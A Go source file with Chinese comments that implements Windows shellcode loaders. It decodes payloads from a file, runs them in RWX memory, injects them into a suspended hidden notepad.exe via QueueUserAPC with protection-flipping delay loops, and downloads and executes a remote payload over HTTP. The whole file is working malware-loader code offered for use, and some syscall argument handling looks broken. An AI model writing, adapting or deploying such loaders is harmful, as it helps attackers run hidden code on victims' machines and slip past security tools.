package tools

import (
	"fmt"
	"golang.org/x/sys/windows"
	"io"
	"net/http"
	"os"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32      = syscall.MustLoadDLL("kernel32.dll")   //调用kernel32.dll
	ntdll         = syscall.MustLoadDLL("ntdll.dll")      //调用ntdll.dll
	VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc") //使用kernel32.dll调用ViretualAlloc函数
	RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")   //使用ntdll调用RtCopyMemory函数
)

func checkErr(err error) {
	if err != nil { //如果内存调用出现错误，可以报出
		if err.Error() != "The operation completed successfully." { //如果调用dll系统发出警告，但是程序运行成功，则不进行警报
			println(err.Error()) //报出具体错误
			os.Exit(1)
		}
	}
}

func original_loader(shellcode []byte) {
	//调用VirtualAlloc为shellcode申请一块内存
	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if addr == 0 {
		checkErr(err)
	}
	//调用RtlCopyMemory来将shellcode加载进内存当中
	_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	checkErr(err)
	//syscall来运行shellcode
	_, _, _ = syscall.SyscallN(addr, 0, 0, 0, 0)
}

func OriginalLoader(fp string) {
	encodeDataByte, err := os.ReadFile(fp)
	if err != nil {
		fmt.Printf("读取文件时出错: %v\n", err)
	}
	shellcode := Decode(encodeDataByte)
	original_loader(shellcode)
}

func APCloader(fp string) error {
	encodeDataByte, err := os.ReadFile(fp)
	if err != nil {
		fmt.Printf("读取文件时出错: %v\n", err)
	}
	fmt.Println("111")
	fish := Decode(encodeDataByte)
	var si windows.StartupInfo
	var pi windows.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))

	kernel32, err := windows.LoadLibrary("kernel32.dll")
	if err != nil {
		return err
	}
	defer windows.FreeLibrary(kernel32)

	createProcess, err := windows.GetProcAddress(kernel32, "CreateProcessA")
	if err != nil {
		return err
	}
	virtualAllocEx, err := windows.GetProcAddress(kernel32, "VirtualAllocEx")
	if err != nil {
		return err
	}
	virtualProtect, err := windows.GetProcAddress(kernel32, "VirtualProtect")
	if err != nil {
		return err
	}
	writeProcessMemory, err := windows.GetProcAddress(kernel32, "WriteProcessMemory")
	if err != nil {
		return err
	}
	queueUserAPC, err := windows.GetProcAddress(kernel32, "QueueUserAPC")
	if err != nil {
		return err
	}

	textPath := syscall.StringToUTF16Ptr("C:\\Windows\\System32\\notepad.exe")
	var creationFlags uint32 = windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW
	_, _, err = syscall.SyscallN(uintptr(createProcess), 10,
		uintptr(unsafe.Pointer(textPath)),
		0,
		0,
		0,
		1,
		uintptr(creationFlags),
		0,
		0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)))
	if err != nil && err != syscall.ERROR_ALREADY_EXISTS {
		return err
	}

	var lpBaseAddress uintptr
	_, _, err = syscall.SyscallN(uintptr(virtualAllocEx), 5,
		uintptr(pi.Process),
		0,
		0x400200,
		windows.MEM_RESERVE|windows.MEM_COMMIT,
		windows.PAGE_EXECUTE_READWRITE,
		uintptr(unsafe.Pointer(&lpBaseAddress)))
	if err != nil {
		return err
	}

	var oldProtect uint32
	// 第一次设置为不可访问（PAGE_NOACCESS）并空循环
	_, _, err = syscall.SyscallN(uintptr(virtualProtect), 4,
		lpBaseAddress,
		uintptr(len(fish)),
		windows.PAGE_NOACCESS,
		uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil {
		return err
	}
	for i := 0; i < 986; i++ {
	}
	// 再设置为可读可写（PAGE_READWRITE）并空循环
	_, _, err = syscall.SyscallN(uintptr(virtualProtect), 4,
		lpBaseAddress,
		uintptr(len(fish)),
		windows.PAGE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil {
		return err
	}
	for i := 0; i < 777; i++ {
	}
	// 又设置为不可访问（PAGE_NOACCESS）并空循环
	_, _, err = syscall.SyscallN(uintptr(virtualProtect), 4,
		lpBaseAddress,
		uintptr(len(fish)),
		windows.PAGE_NOACCESS,
		uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil {
		return err
	}
	for i := 0; i < 321; i++ {
	}
	// 再次设置为可读可写（PAGE_READWRITE）并空循环
	_, _, err = syscall.SyscallN(uintptr(virtualProtect), 4,
		lpBaseAddress,
		uintptr(len(fish)),
		windows.PAGE_READWRITE,
		uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil {
		return err
	}
	for i := 0; i < 123; i++ {
	}
	// 最后设置为PAGE_EXECUTE_READ并空循环
	_, _, err = syscall.SyscallN(uintptr(virtualProtect), 4,
		lpBaseAddress,
		uintptr(len(fish)),
		windows.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldProtect)))
	if err != nil {
		return err
	}
	for i := 0; i < 256; i++ {
	}

	_, _, err = syscall.SyscallN(uintptr(writeProcessMemory), 5,
		uintptr(pi.Process),
		lpBaseAddress,
		uintptr(unsafe.Pointer(&fish[0])),
		uintptr(len(fish)),
		0)
	if err != nil {
		return err
	}

	_, _, err = syscall.SyscallN(uintptr(queueUserAPC), 3,
		lpBaseAddress,
		uintptr(pi.Thread),
		0)
	if err != nil {
		return err
	}

	_, err = windows.ResumeThread(pi.Thread)
	if err != nil {
		return err
	}

	err = windows.CloseHandle(pi.Thread)
	if err != nil {
		return err
	}

	return nil
}

func Remote_loader(url string) []byte {
	resp, err := http.Get(url)
	if err != nil {
		fmt.Println("error when getting remote connection")
		return nil
	}
	defer resp.Body.Close()
	encodeDataByte, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("error when getting remote connection")
		return nil
	}
	shellcode := Decode(encodeDataByte)
	original_loader(shellcode)
	return nil
}
